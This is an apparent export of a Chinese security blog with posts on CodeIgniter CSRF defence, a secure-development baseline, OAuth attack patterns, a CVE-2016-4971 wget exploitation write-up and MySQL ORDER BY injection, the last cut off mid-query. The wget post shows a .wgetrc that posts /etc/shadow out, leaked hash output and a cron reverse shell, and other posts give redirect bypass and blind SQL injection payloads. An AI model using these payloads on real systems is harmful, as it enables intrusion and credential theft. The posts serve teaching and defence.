{"meta":{"title":"Wismartzy's Blog","subtitle":"Choose your love, love your choice.","description":"Worker Security","author":"Wismartzy","url":"http://yoursite.com"},"posts":[{"title":"Codeigniter 是怎么做 CSRF 防御的","slug":"how-codeigniter-do-CSRF-protection","date":"2016-09-27T07:01:48.000Z","updated":"2017-01-09T16:19:14.000Z","comments":true,"path":"2016/09/27/how-codeigniter-do-CSRF-protection/","link":"","permalink":"http://yoursite.com/2016/09/27/how-codeigniter-do-CSRF-protection/","excerpt":"","text":"概述关于如何启用 CSRF 防护，Codeigniter(CI) 官方文档有详细说明。 CSRF 的防御一般比较通用的方案有： Referer验证 Token验证 验证码防御 Referer 验证用起来比较简单，但由于各浏览器在 Referer 字段上有着不同的标准，再加上部分验证代码存在逻辑漏洞，所以，一直以来这个方案存在被绕过的风险，效果不是特别理想。而验证码防御的方案又对用户体验有比较大的影响，所以目前来说，基于 token 的验证是最为可用的 CSRF 防护方案，大量开源框架都采用这种方式来抵御 CSRF 攻击的。当然，也有组合这几种的防御方案，效果比单一使用某一方案更优。 CI &amp; CSRFCI 默认并未开启 CSRF 防御 12// /application/config/config.php$config['csrf_protection'] = FALSE; 若将该值设置为TRUE，则 CI 会对每个 POST 请求进行 CSRF Verify 123456// /system/core/Input.php // CSRF Protection check if ($this-&gt;_enable_csrf === TRUE &amp;&amp; ! is_cli()) &#123; $this-&gt;security-&gt;csrf_verify(); &#125; 上面这一步是在 Input 类的 construct 函数里进行的，这意味着一旦开启 CSRF 防御，将全局作用于所有请求，这样不得不为每个 POST 表单添加一个 token 字段，否则请求会被中断。使用 CI 内置的 form_open() 函数将会自动地在表单中插入一个隐藏的 CSRF 字段，但是如果用 Ajax 去提交 POST 请求，就得为每个请求手动添加 csrf_cookie_name 字段，随请求一起传给服务端。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// /system/core/Security.php /** * CSRF Verify * * @return CI_Security */ public function csrf_verify() &#123; // If it's not a POST request we will set the CSRF cookie if (strtoupper($_SERVER['REQUEST_METHOD']) !== 'POST') &#123; return $this-&gt;csrf_set_cookie(); &#125; // Check if URI has been whitelisted from CSRF checks if ($exclude_uris = config_item('csrf_exclude_uris')) &#123; $uri = load_class('URI', 'core'); foreach ($exclude_uris as $excluded) &#123; if (preg_match('#^'.$excluded.'$#i'.(UTF8_ENABLED ? 'u' : ''), $uri-&gt;uri_string())) &#123; return $this; &#125; &#125; &#125; // Do the tokens exist in both the _POST and _COOKIE arrays? if ( ! isset($_POST[$this-&gt;_csrf_token_name], $_COOKIE[$this-&gt;_csrf_cookie_name]) OR $_POST[$this-&gt;_csrf_token_name] !== $_COOKIE[$this-&gt;_csrf_cookie_name]) // Do the tokens match? &#123; $this-&gt;csrf_show_error(); &#125; // We kill this since we're done and we don't want to polute the _POST array unset($_POST[$this-&gt;_csrf_token_name]); // Regenerate on every submission? if (config_item('csrf_regenerate')) &#123; // Nothing should last forever unset($_COOKIE[$this-&gt;_csrf_cookie_name]); $this-&gt;_csrf_hash = NULL; &#125; $this-&gt;_csrf_set_hash(); $this-&gt;csrf_set_cookie(); log_message('info', 'CSRF token verified'); return $this; &#125; csrf_verify() 函数对非 POST 请求直接写 CSRF cookie，POST 请求就判断是否在 URI 的白名单里面，若不在白名单再进行判断 _POST 和 _COOKIE 里是否有 CSRF token，并且判断两者是否相等，只有在存在且相等的情况下才通过校验，否则提示错误403。这一步的逻辑其实是建立在发起 CSRF 攻击的黑客理论上无法获取第三方 cookie 基础上的，得不到 cookie 便无法构造表单里的 token，就过不了这里的 csrf_verify()。 在校验完成后，为了不污染 _POST 数组，CI 调用 unset 函数处理了 _POST 数组里的 csrf token，重新生成新的 token 并写到 cookie。 123456789101112131415161718192021222324252627282930// /system/core/Security.php /** * CSRF Set Cookie * * @codeCoverageIgnore * @return CI_Security */ public function csrf_set_cookie() &#123; $expire = time() + $this-&gt;_csrf_expire; $secure_cookie = (bool) config_item('cookie_secure'); if ($secure_cookie &amp;&amp; ! is_https()) &#123; return FALSE; &#125; setcookie( $this-&gt;_csrf_cookie_name, $this-&gt;_csrf_hash, $expire, config_item('cookie_path'), config_item('cookie_domain'), $secure_cookie, config_item('cookie_httponly') ); log_message('info', 'CSRF cookie sent'); return $this; &#125; 上面是设置 CSRF 防御 cookie 的函数，cookie 属性可以从配置文件里读取 123456// /application/config/config.php$config['csrf_token_name'] = 'csrf_test_name';$config['csrf_cookie_name'] = 'csrf_cookie_name';$config['csrf_expire'] = 7200;$config['csrf_regenerate'] = TRUE;$config['csrf_exclude_uris'] = array(); cookie 有效期默认是7200秒，也就是2小时，由于一旦开启 CSRF 防御，就是全局作用于所有的请求，所以有时候难免会有误伤，但 CI 并没做到在 controller 层动态配置，而是在 Input 类初始化的位置调用 csrf_verify() 函数完成校验。当然，CI 开放了白名单策略，也就是配置文件里的 $config[&#39;csrf_exclude_uris&#39;] ，可以把不需要做 CSRF 防御的 uri 添加到该值里面。 总结从源码里不难看出 CI 通过比较 _COOKIE 和 _POST 中的 token 值来做 CSRF 防御，咋一看似乎觉得 _COOKIE 和 _POST 的内容对客户端来说都是可控的，但仔细思考一下，在 CSRF 的攻击场景下，攻击者是无法读取到受害者的 cookie 信息的，这也是该防御方式有效的前提所在。","raw":null,"content":null,"categories":[],"tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"},{"name":"审计","slug":"审计","permalink":"http://yoursite.com/tags/审计/"}]},{"title":"产品设计与开发安全基线","slug":"Product-Design-and-Development-Safety-Baseline","date":"2016-09-22T08:10:45.000Z","updated":"2017-01-09T15:41:25.000Z","comments":true,"path":"2016/09/22/Product-Design-and-Development-Safety-Baseline/","link":"","permalink":"http://yoursite.com/2016/09/22/Product-Design-and-Development-Safety-Baseline/","excerpt":"","text":"概述现在甲方的安全工作很大一部分都是围绕防御来做的，而攻防之间本来就信息不对称，因为攻只需一个点，而防得一个面，迫使防御方需要能早知道攻击者的行为，才能针对性设防，这就使得安全工作经常处于被动局面。结合互联网已公开的一些漏洞来看，很有必要为企业建立一套适合自身业务的安全基线，并严格执行，减少低级漏洞的产生，这样安全工程师才会有更多的精力放在对抗上，从而扭转部分被动局面。 安全基线认证与鉴权错误提示 登录错误必须统一字样，比如用户名或密码错误时，返回“错误的用户名或密码”。 服务端抛出的错误禁止直接返回给接口，仅返回“Error”字样，错误内容打到相关服务日志。 登录与注销 有登录功能的系统就必须有注销功能。 后台界面 后台页面必须对用户身份和访问权限进行检查 账号锁定 所有提供外网访问功能的系统，必须启用账号登录失败锁定策略（如3分钟20次登录失败，锁定30分钟） 验证码管理系统 后台管理系统或其他重要系统登录必须设置验证码 有效期 必须设置有效期，且有效期内仅可使用一次 发送频率 以短信或邮件方式发送验证码时，必须限制同一ID或接受者的验证码发送频率 会话安全会话超时 会话token/session必须设有超时机制 会话更新 用户登录成功后，必须更新会话ID，用户注销/重置密码后，必须强制token/session过期。 CookieHttpOnly cookie参数中session id等认证相关的字段必须设置HttpOnly HTTPS传输必须为cookie设置secure 上传下载文件判断 对上传文件后缀进行白名单限制，严格校验文件内容与类型是否匹配 目录跳转 禁止客户端自定义文件下载路径（如：使用../../../../进行跳转） 目录权限 存储上传文件的目录必须禁止脚本执行权限 传输安全参数提交 禁止通过 HTTP GET 方式提交不安全算法处理过的用户密码 明文传输 禁止通过 HTTP 明文传输用户登录密码、支付密码、银行卡号等敏感数据 支付安全 禁止在支付密码的传输过程中使用不安全算法 存储安全敏感数据存储 禁止数据库、日志文件中明文存储用户登录密码、支付密码、银行卡号、身份证号码等敏感数据 日志审计审计内容 自建用户系统，必须记录：时间/用户ID/操作/结果/IP等信息 日志清除 除审计用户外，其他人员不应该具备日志修改、删除、清空的权限，必须记录清空日志的行为 日志存储 禁止将日志直接保存在可被浏览器访问到的WEB目录中 其他后门 禁止在代码中留置后门 最后基线制定事简单，关键在于如何推动研发遵循，而这个问题又可以开一篇文章聊了。 参考 VIP产品设计与开发红线 v2.0","raw":null,"content":null,"categories":[],"tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"}]},{"title":"会说话的状态码","slug":"hui-shuo-hua-de-zhuang-tai-ma","date":"2016-09-09T15:33:23.000Z","updated":"2017-01-09T16:27:00.000Z","comments":true,"path":"2016/09/09/hui-shuo-hua-de-zhuang-tai-ma/","link":"","permalink":"http://yoursite.com/2016/09/09/hui-shuo-hua-de-zhuang-tai-ma/","excerpt":"","text":"0x01我在某次授权渗透时候碰到的场景： 渗透对象： 某电商 APP 目标缺陷： API 设计不合理导致可泄露业务相关敏感信息 测试过程： APP 含有购买功能，购买后会为订单生成订单号，此处订单号并不连续且为纯数字。为了进行越权测试，我注册了两个账户，分别进行一次购买行为。测试时我用 Burp 截取查看订单功能的数据包，并修改 URL 中的订单号为任意数字，向服务端再次提交请求，经过多次测试，发现服务端的返回请求状态码不是 403 就是 404，基本可以确定此处不存在订单越权查看问题，但是根据服务端返回的状态码，不难推测出如下结论： 404 即该订单号对应的订单不存在 403 即该订单存在，但不允许我查看 0x02那么可以怎么利用呢？订单属于商业敏感数据，APP 开发者当然不愿意自己的实际订单数据被用户或竞争对手拿到，在这里我可以根据遍历订单编号得到的服务端返回状态码（403 即订单存在）确定该 APP 的实际订单量。 类似场景还有，当获取用户个人主页时候，Restful 接口类似如下： GET /users/123/profile HTTP/1.1 Host: target.com 修改 123 为其他数字，根据服务端返回状态码是否为 403 即可判断对应用户是否存在，在确定注册用户 id 递增的情况下，那么可以在月初注册一个账户拿到用户 id，记为 num1，月末注册另一账户并拿到用户 id，记为 num2，再遍历下刚刚的接口，就能筛选出 num1、num2 之间的用户数量了，也即为一个月的新增用户数。 对创业公司来说，倘若投资人以某种渠道拿到了你们产品的真实注册用户数和订单量，你觉得他还会在乎你 PPT 上的内容吗？当然，这有点夸张了XD。 0x03在我看来，当一个用户访问的资源不属于自己时，服务端返回 403 和 404 都是可以的，403 指 Forbidden，禁止用户访问不属于自己的资源，404 指 Not Found，用户不能看到不属于自己的资源，也能解释通。另外，也有服务端会返回 401，401 指 Unauthorized，用户未授权访问不属于自己的资源，依然合理。 那到底该用哪一个呢？去翻了下 RFC2616，对 403 状态码的解释里有这么一句： If the server does not wish to make this information available to the client, the status code 404 (Not Found) can be used instead. 大概意思就是，只要服务端不想暴露信息给客户端，接口都统一返回 404，完整部分可以看下图： 针对上面我碰到的场景来说，总结一句话就是 未授权用户访问有效资源时，服务端统一返回 404 更安全","raw":null,"content":null,"categories":[],"tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"}]},{"title":"OAuth Security Cheatsheet","slug":"OAuth-Security-Cheatsheet","date":"2016-08-21T04:53:56.000Z","updated":"2017-01-09T15:36:53.000Z","comments":true,"path":"2016/08/21/OAuth-Security-Cheatsheet/","link":"","permalink":"http://yoursite.com/2016/08/21/OAuth-Security-Cheatsheet/","excerpt":"","text":"State-Of-The-Art OAuth2 Homakov Edition考虑到官方OAuth2规范的脆弱性以及易受攻击的服务提供商和客户端的集成数，有了满足secure-by-default原则的OAuth版本-Homakov CSRF防护初始请求/connect/provider的时候，总是使用和需要state参数，不允许动态的redirect_uri，默认不允许response_type=hash（以前是token），废弃refresh_token和token，而不是用appsecret_proof去认证每个access_token，仔细检查用户想要连接的服务提供商账户，access_token永不过期（把它当做公开的user_id） 1、用户点击连接服务提供商的按钮，无论是发起一个POST表单提交（受CSRF Token防护的）到/connect/provider_name，还是由GET导航到/connect/provider?csrf_token=TOKEN，初始步骤一定要受CSRF防护，它不应该被来自其他源的连接触发，必须有来自于用户的明确的确认。 2、在服务端/connect/provider客户端的控制器应该确认csrf_token和来自于session里的token一致，然后生成state token（CSRF Token，确保OAuth流程完整性），并命名为&lt;provider&gt;-state存储在session里。然后跳转到provider.com/oauth/authorize?client_id=CLIENT_ID&amp;redirect_uri=CLIENT/callback&amp;state=STAT，scope参数是可选的（应该仅仅允许被认证过的客户端接触一些关键的作用域） 3、服务提供商检查redirect_uri是否在重定向URI的白名单中（主机，路径，查询参数，hash必须是静态的）。每一个redirect_uri它不能是一个参数，还必须要有响应的返回类型，默认是query，移动app是hash。state参数必须由服务供应商要求（尽管规范上说该参数是可选的—对大多数开发者来说这就是不需要的代名词）。 4、用户在服务提供商域下看到同意/拒绝按钮，在点击同意按钮后受CSRF Token防护的POST表单被提交到相同的URL（不要像Outlook或Doorkeeper或者在授权的时候CSRF攻击服务提供商）。 5、response_type为query时候重定向到CLIENT/callback?access_token=TOKEN&amp;state=STATE（所有的token被存储在中央服务器，并且每个API请求用appsecret_proof签名），response_type为hash的时候会重定向到CLIENT/callback#access_token=TOKEN&amp;state=STATE（所有的token被存储在本地应用里，并不需要appsecret_proof）。这两种情况下客户端都一定要检查STATE是否等于来自season的provider-state。 6、为什么access_token从不过期？因为我们不再需要refresh_token/code。用refresh_token攻击者能使用access_token获得一个窗口去发送垃圾邮件或者下载所有受害者的社交图片。仅当access_token过期，根据规范，客户端应该使用refresh_token和client_secret去获取一个新的token。除了这个场景，我们将需要最早由Facebook引入的appsecret_proof。如果response_type为query的时候，token被返回，那么每一个到服务提供商的请求一定要有access_token和appsecret_proof=hash_hmac(&#39;sha256&#39;, $access_token, $client_secret);。现在如果攻击者泄露access_token，token毫无价值。即使他们偷了你的client_secret，你也能很简单的换掉。 7、可选的，但是是推荐的。在连接账户之前，你应该询问用户是否要连接到例如myfbemail@email.com的Facebook账户。因为有很多的攻击比如cookie forcing, login/logout CSRF, RECONNECT能够静默将用户登录到服务提供商的恶意账户里。 关于这个文档描述常见的OAuth/Single Sign On/OpenID相关的漏洞。很多跨站交互容易受到不同类型的泄露和劫持。 Hacker和开发者都能通过阅读它收获益处。 OAuth是一个重要的功能，他负责对访问用户敏感数据进行认证和授权。糟糕的实现OAuth是一个接管账户的可靠方式，不像XSS，它很容易利用，但是对受害者来说很难避免（NoScript不会有作用，因为这个攻击不需要JavaScript）。由于OAuth，许多初创公司包括SoundCloud，Foursquare，Airbnb，About.me、Bit.ly、Pinterest、Digg，StumbleUpon，Songkick有帐户劫持漏洞。并且很多网站仍然是脆弱的。我们的动机是让人们意识到“社交登录”的风险，我们鼓励你非常小心地使用OAuth。这个小抄并不会解释OAuth是怎样的工作流程，请自行去官方站点查看 授权code流通过连接攻击者提供的服务提供商账户导致客户端账户被劫持正如最常见的OAuth2漏洞里面说的，换句话说就是CSRF。 服务提供商通过重定向用户代理（译者注：浏览器）到SITE/oauth/callback?code=CODE来返回授权code，现在客户端必须发送授权code和客户端凭证、redirect_uri一起来获得access_token 如果客户端执行的时候没有使用state参数去减轻CSRF问题，我们可以很容易的使用我们的服务提供商账户连接受害者的客户端账户。 它对有社交登录和有能力为已存在的主账户添加一个登陆选项的客户端有用（下面是来自pinterest.com的截图） 修复：在发送用户跳转到服务提供商的请求时生成一个随机值并且保存在cookie或者session里面，当用户从服务提供商返回的时候确认你收到的state参数值和之前保存在cookies或session里面的那个值相等。 缺陷：由于以前的代码利用用户提供的/connect?state=user_supplied而不是生成一个随机的，所以在omniauth这种情况下是有可能控制固定state的。 这是另外一个OAuth设计问题 - 有时候开发者想要使用state表达出自己的目的，尽管你能同时发送这样的值state=welcome_landing.random_nonce但是毫无疑问它看起来很丑陋，一个简洁的方案是使用JSON Web Token作为state。 服务提供商乱用固定会话导致客户端账户劫持尽管客户端合理的校验了state参数，我们仍然可能在服务提供商替换认证cookie为攻击者的账户：在登录（VK, Facebook）时候使用CSRF，头部注入，或者cookie forcing or tossing。 然后我们仅仅载入一个GET请求触发连接（omniauth中/user/auth/facebook），Facebook将返回攻击者的用户信息（uid=攻击者的uid）并且它最终将连接攻击者的服务提供商账户到受害者的客户端账户。 修复：确保添加一个新的社交连接需要一个有效的csrf_token，因为这是不可能触发CSRF的过程。理想情况下，使用POST而不是GET。 Facebook拒绝从他们那边修复登录时的CSRF，所以很多库仍然易受攻击。不要期望服务提供商给你可靠的认证数据。 泄露授权code导致账户劫持OAuth文档很清楚的指明了服务提供商必须检查第一次的redirect_uri等于客户端用来获取access_token的redirect_uri。我们并没有真正的检查它因为它看起来很难出错。令人惊讶的是很多服务提供商错了：Foursquare (reported), VK (report, in Russian), Github (可能泄露私有项目的tokens), 和很多“自研”的单点登录插件。 攻击方式很直接：在客户端域内找到一个漏洞页面，插入跨域图片或者一个链接到你的网站，然后使用这个页面地址作为redirect_uri。当受害者载入构造好的URL，它将引导受害者到leaking_page?code=CODE，并且受害者的用户代理将授权code暴露在http头的Referrer字段。 现在你能重新使用泄露的授权code和实际的redirect_uri去登录受害者账户。 修复：灵活的redirect_uri是一个不好的做法，但是，如果你需要它，那么每次请求授权code的时候存储redirect_uri并且在access_token生成的时候校验它。 隐式流在打开跳转链接的时候泄露access_token/signed_request这是过去被媒体宣传为“重定向覆盖”的攻击，但事实上它已经被发现很多年了。你仅需要找到一个客户端域名或者其子域名的重定向漏洞，把该地址作为redirect_uri并且替换response_type为token,signed_request发送出去，302跳转将会保留#fragment，而攻击者的Javascript代码可以访问location.hash（即为url的fragment字段值）。 泄露access_token能够被用来发送垃圾邮件和破坏你的隐私。此外，泄露的signed_request是更敏感的数据。通过在你完全授权用Facebook登录的客户端找到一个重定向漏洞。 修复：在应用的设置里仅允许一个redirect_uri白名单。 使用攻击者的客户端发出的access_token导致账户劫持也被称为One Token to Rule Them All，这个bug与移动端和客户端应用有关，因为他们经常直接使用用户提供的access_token。 想象一下，用户有很多“授权秘钥”并且给任何他想要登录的新网站一个秘钥。一个恶意的站点管理员能够使用用户的的秘钥去登陆他的客户已经登录过的其他站点。 修复： 在接受用户提供的access_token前检查下它是否是你的client_id在https://graph.facebook.com/app?fields=id&amp;access_token=TOKEN生成的。 传输和JS SDK漏洞为了更好的支持客户端应用（或者浏览器应用），一些OAuth2服务提供商添加了一些隐式流外的自定义规格变体。涉及到一个代理/中继页作为访问token的路由。这个代理和客户端应用的页面通讯或者通过标准的HTML5的postMessage API，或者使用旧的方式：指定window name和url（也被叫做Fragment传输），还有Adobe Flash的LocalConnection API 不管选择的方法是什么，确保代理呢个个仅和目标源交换信息是很重要的，不接受来自伪造的应用的页面，并且最终去确认这些客户端的检查和服务端的检查是一致的。客户端安全传输失败通常导致下面两种问题： 泄露数据给攻击者（授权和认证绕过） 信任来自攻击者的数据（session固话攻击） 另外，现代web应用趋向于丰富的javascript前端库，以及不安全的客户端通讯导致超越OAuth本身的更严重的攻击。 修复： 完全禁用所有旧的客户端通讯方法（Flash或者Fragment），使用postMessage 检查所有进和出的消息的源，仅允许目标应用的域 确保所有客户端源检查和服务端源检查一致 在与另一方开始数据传输前用加密的随机数校验 其他##泄露客户端凭证威胁客户端凭证不再像它听起来那样重要。你唯一能做的是使用泄露的页面泄露授权code，然后手动为它们获取access_token（提供泄露的redirect_uri，而不是实际的）。尽管这个威胁当服务提供商使用静态redirect_uri的时候能够得到缓解。 session固话（OAuth1.0）OAuth2和OAuth1最主要的不同在于你传给服务提供商的参数。第一个版本里你发送所有的参数给服务提供商然后获取对应request_token。接着你引导用户到provider?request_token=TOKEN，然后在授权用户完后重定向返回到client/callback?request_token=SAME_TOKEN。 在这里固话的意思是我们能欺骗用户接受我们提供的发送给我们的Token1，然后在客户端的callback里重用Token1 这个不是严重的漏洞，因为主要是基于网络钓鱼。FYI Paypal express checkout has this bug 中间服务提供商许多初创公司都用Facebook连接，与此同时，他们也是服务提供商。作为服务提供商，他们必须重定向用户到第三方站点，这些“开放的重定向”你没法修复。它使得这个链成为可能：Facebook -&gt; 中间服务提供商 -&gt; 客户端的回调，导致FB的token泄露。 要修复这个问题，Facebook在回调URL的后面添加#_=_。你调用的时候应该去掉fragment来防止泄露。以这种方式重定向：Location: YOUR_CLIENT/callback?code=code# 用技巧绕过redirect_uri校验如果你被允许设置子目录，下面是目录遍历的技巧： /old/path/../../new/path /old/path/%2e%2e/%2e%2e/new/path /old/path/%252e%252e/%252e%252e/new/path /new/path///../../old/path/ /old/path/.%0a./.%0d./new/path (For Rails, because it strips \\n\\d\\0) 重放攻击授权code通过GET发送，并将存储在日志中，服务提供商一定要在使用或过期5分钟内删除它。 开放的重定向泄露授权code通常你需要referrer泄露页面去泄露查询参数。这有两种通过开放的重定向来实现的技巧： 当重定向使用&lt;meta&gt;标签而不是302状态和Location头的话，它将泄露跳转页面的referrer到下一个请求中。 当你管理redirect_uri的尾部去添加%23（#），它将导致在fragment位置发送授权codeLocation: http://CLIENT/callback/../open_redirect?to=evil#&amp;code=CODE 贡献者@homakov(https://twitter.com/homakov), @isciurus(https://twitter.com/isciurus) and you? 原文地址：http://www.oauthsecurity.com","raw":null,"content":null,"categories":[],"tags":[{"name":"OAuth","slug":"OAuth","permalink":"http://yoursite.com/tags/OAuth/"}]},{"title":"wget 重定向漏洞（CVE-2016-4971）","slug":"wget-redirection-vulnerability","date":"2016-07-26T03:55:18.000Z","updated":"2017-01-09T16:19:08.000Z","comments":true,"path":"2016/07/26/wget-redirection-vulnerability/","link":"","permalink":"http://yoursite.com/2016/07/26/wget-redirection-vulnerability/","excerpt":"","text":"概述GNU wget 低于1.18版本均存在任意文件上传/可能还会造成远程代码执行CVE-2016-4971。当提供给wget一个恶意的url时，wget（版本低于1.18）会执行url所指向的webserver返回头中的30x跳转，造成wget会保存攻击者提供的任意远程文件。 验证环境 webserver 10.0.97.225/192.168.1.148 logserver 10.0.97.243/192.168.1.149 步骤在webserver上起了个nginx，nginx.conf里配置了一个302跳转，另外还起了一个ftp服务，监听21端口，python -m pyftpdlib -p21 -w logserver上wget版本信息 在机器（logserver）上使用wget发起对webserver的访问，从debug信息可以看到wget在遇到30x返回码的时候是不做任何验证就去请求FTP了。 ftp的log： 结果webserver上的/root/.bash_profile文件就被下载到了发起wget请求的logserver上了，而wget本来是想请求下载webserver上的safe-file.txt文件的。 利用场景Cronjob在webserver上准备好.wgetrc文件 123[root@localhost ~]# cat .wgetrcpost_file = /etc/shadowoutput_document = /etc/cron.d/wget-root-shell 假设现在有需求在服务器logserver上cron脚本每分钟去拉webserver的log文件 1*/1 * * * * root wget -N http://webserver/nginx-access.log &gt; /dev/null 2&gt;&amp;1 通过cron的日志可以看到job被执行了 1Jul 13 18:54:02 logserver CROND[4161]: (root) CMD (wget -N http://webserver/safe-file.txt &gt; /dev/null 2&gt;&amp;1) 这个job是root用户执行的，所以去root家目录下查看是否已经有.wgetrc文件了 这里有点鸡肋的是如果该目录下已经存在.wgetrc文件，那么wget下载回来的.wgetrc文件将被重命名，就没法控制目标的下载行为了。 既然上传了.wgetrc文件，接下来可以再深入点，反弹个shell试试： 在webserver上运行exploit-db提供的exp脚本 12345[root@localhost ~]# python wget_exp.pyReady? Is your FTP server running?FTP found open on 192.168.1.148:21. Let&apos;s go thenServing wget exploit on port 80... 从logserver上发起到webserver的请求，此时webserver上监听的端口开始有回显 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051We have a volunteer requesting /nginx-access.log by POST :)Received POST from wget, this should be the extracted /etc/shadow file:---[begin]--- root:$6$t8Pjy8CmXZGtsjRL$ZG.pnIDxJasLKzHA/lVR0GPlLezD1GbqVa1b3zYndE/j8jJbXbF03X8gc9AOcVkM.ZM2EYI2G7m3jCcY3QS/C.:16524:0:99999:7:::bin:*:16231:0:99999:7:::daemon:*:16231:0:99999:7:::adm:*:16231:0:99999:7:::lp:*:16231:0:99999:7:::sync:*:16231:0:99999:7:::shutdown:*:16231:0:99999:7:::halt:*:16231:0:99999:7:::mail:*:16231:0:99999:7:::operator:*:16231:0:99999:7:::games:*:16231:0:99999:7:::ftp:*:16231:0:99999:7:::nobody:*:16231:0:99999:7:::dbus:!!:16524::::::polkitd:!!:16524::::::avahi:!!:16524::::::avahi-autoipd:!!:16524::::::postfix:!!:16524::::::sshd:!!:16524::::::tcpdump:!!:16535::::::tss:!!:16545::::::user01:!!:16552:0:99999:7:::user02:!!:16553:0:99999:7:::nscd:!!:16566::::::nslcd:!!:16566::::::ntp:!!:16573::::::saslauth:!!:16575::::::mailnull:!!:16575::::::smmsp:!!:16575::::::www:!!:16653:0:99999:7:::mysql:!!:16653::::::td-agent:!!:16862::::::systemd-bus-proxy:!!:16874::::::systemd-network:!!:16874::::::unbound:!!:16874::::::ocserv:!!:16874::::::ossec:!!:16944:0:99999:7:::redis:!!:16957::::::---[eof]---Sending back a cronjob script as a thank-you for the file...It should get saved in /etc/cron.d/wget-root-shell on the victim&apos;s host (because of .wgetrc we injected in the GET first response)192.168.1.149 - - [13/Jul/2016 21:30:11] &quot;POST /nginx-access.log HTTP/1.1&quot; 200 -File was served. Check on /root/hacked-via-wget on the victim&apos;s host in a minute! 此时，在logserver上已经被写入了cron任务，每分钟执行一次的反弹shell任务 等待一分钟，cronjob执行，反弹shell成功 修复官方的修复方案为在调用从FTP下载文件的函数时多传了一个原始URL参数，在生成本地文件的文件名时使用了原始的URL所带的文件名，而不是使用跳转后FTP连接中的文件名了。具体修改部分可以从commit上查看到。而我们用户要做的就是升级服务器上GNU wget版本至最新或1.18以上。 总结我发你一个链接，你敢wget吗？ 参考 https://www.exploit-db.com/exploits/40064/ http://blog.nsfocus.net/wget-analysis-redirection-vulnerability-technology-protection-scheme/","raw":null,"content":null,"categories":[],"tags":[{"name":"CVE","slug":"CVE","permalink":"http://yoursite.com/tags/CVE/"}]},{"title":"MySQL Order By 注入","slug":"MySQL-Order-By-Injection","date":"2016-07-15T13:34:30.000Z","updated":"2017-02-15T14:27:05.000Z","comments":true,"path":"2016/07/15/MySQL-Order-By-Injection/","link":"","permalink":"http://yoursite.com/2016/07/15/MySQL-Order-By-Injection/","excerpt":"","text":"如果问一个安全/程序员如何才能防 SQL 注入问题？我想大部分人都会提到使用参数化查询，那是不是这样就高枕无忧了呢？换句话说是不是使用参数化查询后就能杜绝一切 SQL 注入问题呢？答案是否定的，参数化查询是针对参数值的绑定技术解决注入问题，而 SQL 语句中某些字段位置并不支持绑定技术，比如 ORDER BY 关键字后跟列名。当该列名的输入对用户可控时，在 SQL 注入问题上，参数化查询就束手无策了。 验证漏洞查找疑似和 ORDER BY 关键字有关的参数，构造合适 Payload： 12orderby=ASC,if(1=1,1,(select 1 from information_schema.tables))&amp;key=valueorderby=ASC,if(1=2,1,(select 1 from information_schema.tables))&amp;key=value 因为 select 1 from information_schema.tables 会返回多个行，MySQL 会报“ERROR 1242 (21000): Subquery returns more than 1 row” 的错误，从而整条语句执行失败将无结果返回。 漏洞分析首先看下 SELECT 语法（MySQL 5.7） 123456789101112131415161718192021222324SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [MAX_STATEMENT_TIME = N] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr ...] [FROM table_references [PARTITION partition_list] [WHERE where_condition] [GROUP BY &#123;col_name | expr | position&#125; [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY &#123;col_name | expr | position&#125; [ASC | DESC], ...] [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE &apos;file_name&apos; [CHARACTER SET charset_name] export_options | INTO DUMPFILE &apos;file_name&apos; | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]] 可以看出一条正确 SQL 语句 ORDER BY 关键字后面可以是列名、列别名、列位置，且 ORDER BY 后面不能跟 UNION SELECT 子句，该位置的注入主要有如下姿势： 基于时间的盲注12345678GET parameter &apos;sort&apos; is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection points with a total of 46 HTTP(s) requests:---Parameter: sort (GET) Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT) Payload: sort=1 AND (SELECT * FROM (SELECT(SLEEP(5)))kYbh)--- 12345678910111213141516171819MariaDB [security]&gt; SELECT * FROM users ORDER BY 1 AND (SELECT * FROM (SELECT(SLEEP(5)))kYbh);+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 |+----+----------+------------+13 rows in set (5.00 sec) 基于布尔盲注12345678GET parameter &apos;sort&apos; is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection points with a total of 46 HTTP(s) requests:---Parameter: sort (GET) Type: boolean-based blind Title: MySQL &gt;= 5.0 boolean-based blind - Parameter replace Payload: sort=(SELECT (CASE WHEN (8618=8618) THEN 8618 ELSE 8618*(SELECT 8618 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))--- 12345678910111213141516171819MariaDB [security]&gt; SELECT * FROM users ORDER BY (SELECT (CASE WHEN (8618=8618) THEN 8618 ELSE 8618*(SELECT 8618 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END));+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 |+----+----------+------------+13 rows in set (0.00 sec) 下图可以反映验证漏洞环节提到的情况，这也是我在测试过程中常用的验证是否存在注入点的方式。 报错注入（前提是支持报错）12MariaDB [security]&gt; SELECT * FROM users ORDER 